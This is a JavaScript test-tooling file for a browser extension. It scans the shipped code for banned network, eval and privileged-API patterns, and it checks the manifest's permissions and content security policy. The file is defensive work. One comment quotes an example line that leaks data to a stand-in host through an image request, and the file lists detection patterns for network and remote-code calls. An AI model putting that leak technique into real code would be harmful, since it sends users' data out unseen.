// OpenFullPage, shipped-surface invariant scanner.
//
// Implements V1-SPEC §5. Zero dependencies, no build step. This file is test
// tooling and is never shipped inside the CRX, which is why it may contain the
// very patterns it bans.

import { execFileSync } from 'node:child_process';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, relative, resolve } from 'node:path';

export const REPO_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..', '..');

// The CRX surface: the manifest plus everything under src/. Nothing else is
// shipped, so nothing else is scanned.
const SHIPPED_ROOTS = ['src', 'icons'];
const SHIPPED_FILES = ['manifest.json'];
const TEXT_EXTENSIONS = ['.js', '.mjs', '.html', '.css', '.json'];

// Everything a stranger reads that is not the shipped surface: the prose, the
// store copy, and the tools that generate committed artefacts. Scanned for
// product names too, because the shipped surface was cleaned first and the
// claims simply moved into the documents nobody was scanning.
const PROSE_ROOTS = ['docs', 'store', 'tools'];
const PROSE_EXTENSIONS = ['.md', '.mjs', '.js', '.go'];

/**
 * The one file allowed to name another product.
 *
 * The MIT licence of the work this is derived from asks for the attribution, and
 * the disclaimer of association with any commercial successor has to name the mark
 * it is disclaiming. That is the whole exemption. The scanner itself and the
 * poisoned fixture also carry these names, and need no entry here: `test/` is not
 * one of the roots either collection walks, so it is only ever scanned when a test
 * hands it over deliberately, which is exactly what proves the gate still fires.
 */
const BRAND_EXEMPT = ['NOTICE.md'];

// V1-SPEC §5. Named so a failure says what was violated, not just which regex.
export const BANNED = [
  ['network: fetch()', /\bfetch\s*\(/],
  ['network: XMLHttpRequest', /XMLHttpRequest/],
  ['network: WebSocket', /WebSocket/],
  ['network: sendBeacon', /sendBeacon/],
  ['remote code: eval()', /\beval\s*\(/],
  ['remote code: new Function', /new\s+Function/],
  ['injection sink: .innerHTML =', /\.innerHTML\s*=/],
  [
    'privileged API',
    /chrome\.(declarativeNetRequest|webRequest|cookies|history|bookmarks|debugger|proxy)/,
  ],
  // storage.local stays on the machine. storage.sync ships the user's
  // configuration to Google, which is a network path this extension otherwise
  // does not have, so settings may be stored, but never synced.
  ['synced storage', /chrome\.storage\.sync/],
  // The CSP is the wall; these two are the tripwire. A remote subresource is the
  // one network path `connect-src 'none'` never covered, and the directives that
  // close it are easy to drop in an edit that looks harmless. Catching the
  // assignment as well as the policy means a mistake fails the suite rather than
  // waiting for someone to re-read the manifest.
  ['remote subresource: src assignment', /\.(?:src|srcset)\s*=\s*['"`][^'"`]*https?:\/\//],
  ['remote subresource: CSS url()', /url\(\s*['"]?https?:\/\//],
  // The fourth rule, in the one place it is easy to break by accident. Reading
  // the clipboard asynchronously needs `clipboardRead`, granted at install; the
  // `paste` event and its `clipboardData` need nothing at all, because the
  // reader pressing paste is the authorisation. The two look interchangeable in
  // a diff and are one permission apart, so the wrong one fails the suite.
  // Writing is not on this list: `navigator.clipboard.write` needs no permission
  // and the Copy button uses it.
  ['permission creep: asynchronous clipboard read', /navigator\.clipboard\.read/],
];

/**
 * Other products, by name.
 *
 * Not a legal control: naming a competitor factually is lawful, and this repo
 * still names one in NOTICE.md, where the MIT licence requires it and where the
 * disclaimer of association is the point. It is hygiene for the surfaces a
 * stranger reads. A comment saying a control was taken from a named product is
 * the document you least want to exist in a dispute, whatever the code actually
 * does, and design conventions can be explained without naming anyone: "the
 * convention in annotation tools" says the same thing and is also more accurate,
 * because the convention is nobody's property.
 *
 * "Preview" is deliberately absent. It is an ordinary English word this codebase
 * uses for render previews, and a rule that cannot be obeyed is worse than none.
 */
export const OTHER_PRODUCTS = [
  'gofullpage', 'fireshot', 'flameshot', 'lightshot', 'snagit', 'greenshot',
  'sharex', 'ksnip', 'awesome screenshot', 'nimbus screenshot', 'figma',
];

/** @returns {string[]} findings, empty when nothing in `files` names anybody */
export function scanBrands(files) {
  const extensions = [...new Set([...TEXT_EXTENSIONS, ...PROSE_EXTENSIONS])];
  const problems = [];
  for (const file of files) {
    if (BRAND_EXEMPT.includes(file)) continue;
    if (!extensions.some((ext) => file.endsWith(ext))) continue;
    const text = readFileSync(join(REPO_ROOT, file), 'utf8').toLowerCase();
    for (const product of OTHER_PRODUCTS) {
      if (text.includes(product)) problems.push(`${file}: names another product, "${product}"`);
    }
  }
  return problems;
}

function walk(dir, out) {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const full = join(dir, entry.name);
    if (entry.isDirectory()) walk(full, out);
    else if (entry.isFile()) out.push(relative(REPO_ROOT, full));
  }
  return out;
}

function collect(roots, seed = []) {
  const found = [...seed];
  for (const root of roots) {
    const abs = join(REPO_ROOT, root);
    try {
      if (statSync(abs).isDirectory()) walk(abs, found);
    } catch {
      // Directory not created yet; nothing to read from it.
    }
  }
  return found.sort();
}

/** Every path shipped in the CRX, repo-relative, sorted. */
export function shippedFiles() {
  return collect(SHIPPED_ROOTS, SHIPPED_FILES);
}

/**
 * Documents and tooling: the prose a reader meets before any code, plus the
 * scripts that generate committed artefacts. Root-level Markdown is included by
 * name because the repository root also holds the licence and generated files.
 */
export function proseFiles() {
  const root = readdirSync(REPO_ROOT, { withFileTypes: true })
    .filter((entry) => entry.isFile() && entry.name.endsWith('.md'))
    .map((entry) => entry.name);
  return collect(PROSE_ROOTS, root);
}

function isText(path) {
  return TEXT_EXTENSIONS.some((ext) => path.endsWith(ext));
}

/**
 * Scan file contents for banned patterns.
 * @param {Array<{path: string, source: string}>} files
 * @returns {Array<{path: string, line: number, rule: string, text: string}>}
 */
export function scanSources(files) {
  const violations = [];
  for (const { path, source } of files) {
    const lines = source.split('\n');
    for (const [rule, pattern] of BANNED) {
      lines.forEach((text, i) => {
        if (pattern.test(text)) {
          violations.push({ path, line: i + 1, rule, text: text.trim() });
        }
      });
    }
  }
  return violations;
}

/** Read and scan the real shipped surface. */
export function scanShipped() {
  const files = shippedFiles()
    .filter(isText)
    .map((path) => ({ path, source: readFileSync(join(REPO_ROOT, path), 'utf8') }));
  return scanSources(files);
}

export function readManifest() {
  return JSON.parse(readFileSync(join(REPO_ROOT, 'manifest.json'), 'utf8'));
}

// V1-SPEC §4 ("deliberately absent") and §6 (branding gate).
//
// `optional_host_permissions` is deliberately NOT on this list as of 1.3.0: the
// extension may *offer* broad access for reading inside cross-origin frames, so
// long as it is never granted by default and the user can revoke it. Required
// `host_permissions` remains banned, that is the one that needs no consent.
const FORBIDDEN_MANIFEST_KEYS = [
  'host_permissions',
  'web_accessible_resources',
  'externally_connectable',
  'update_url',
];

// Anything broader than this may not even be offered.
const ALLOWED_OPTIONAL_HOSTS = ['<all_urls>'];
// `connect-src 'none'` stops fetch, XHR, WebSocket and beacons. It does nothing
// about a subresource: an absent directive with no `default-src` to fall back on
// is unrestricted, so a policy that names only the three above leaves `img-src`,
// `style-src`, `font-src` and `media-src` wide open, and
// `new Image().src = 'https://host/?d=' + data` is a network path out. Every
// directive is listed rather than leaning on one `default-src`, because a reader
// checking the claim should be able to see each answer instead of deriving it.
// See DECISIONS.md D15.
const REQUIRED_CSP_DIRECTIVES = [
  "script-src 'self'",
  "object-src 'none'",
  "connect-src 'none'",
  "frame-src 'none'",
  "img-src 'self' data: blob:",
  "style-src 'self' 'unsafe-inline'",
  "font-src 'self'",
  "media-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
];

/** @returns {string[]} human-readable failures; empty means the manifest is clean. */
export function checkManifest(manifest) {
  const problems = [];

  if (manifest.manifest_version !== 3) {
    problems.push(`manifest_version must be 3, got ${manifest.manifest_version}`);
  }

  for (const key of FORBIDDEN_MANIFEST_KEYS) {
    if (key in manifest) problems.push(`manifest must not declare "${key}"`);
  }

  // Broad access may be offered but never held by default: everything in
  // `permissions` is granted silently at install, so it has to stay minimal.
  const REQUIRED_ALLOWED = ['activeTab', 'scripting', 'storage'];
  for (const permission of manifest.permissions ?? []) {
    if (!REQUIRED_ALLOWED.includes(permission)) {
      problems.push(`"${permission}" must be optional, not granted at install`);
    }
  }

  for (const origin of manifest.optional_host_permissions ?? []) {
    if (!ALLOWED_OPTIONAL_HOSTS.includes(origin)) {
      problems.push(`optional_host_permissions may not include "${origin}"`);
    }
  }

  const csp = manifest.content_security_policy?.extension_pages ?? '';
  for (const directive of REQUIRED_CSP_DIRECTIVES) {
    if (!csp.includes(directive)) {
      problems.push(`extension_pages CSP must contain "${directive}"`);
    }
  }

  // Branding gate. V1-SPEC §6, Decision 8. Inherit none of GoFullPage's marks.
  if (/gofullpage/i.test(manifest.name ?? '')) {
    problems.push(`name must not reuse the GoFullPage mark, got "${manifest.name}"`);
  }

  return problems;
}

/**
 * No-build-step assertion (V1-SPEC §5): every file in the packed zip is
 * byte-identical to the same path in the working tree. This is what makes the
 * `diff -r` verification promise in §1 mechanically true rather than asserted.
 * @returns {string[]} failures; empty means the zip matches the tree.
 */
export function checkPackedZip(zipPath) {
  const problems = [];
  const listed = execFileSync('unzip', ['-Z1', zipPath], { encoding: 'utf8' })
    .split('\n')
    .map((line) => line.trim())
    .filter((line) => line && !line.endsWith('/'))
    .sort();

  const expected = shippedFiles();
  for (const path of listed) {
    if (!expected.includes(path)) problems.push(`zip contains unexpected file: ${path}`);
  }
  for (const path of expected) {
    if (!listed.includes(path)) problems.push(`zip is missing shipped file: ${path}`);
  }

  for (const path of listed.filter((p) => expected.includes(p))) {
    const packed = execFileSync('unzip', ['-p', zipPath, path], { maxBuffer: 64 * 1024 * 1024 });
    const tracked = readFileSync(join(REPO_ROOT, path));
    if (!packed.equals(tracked)) {
      problems.push(`zip copy of ${path} differs from the working tree (a build step crept in)`);
    }
  }

  return problems;
}
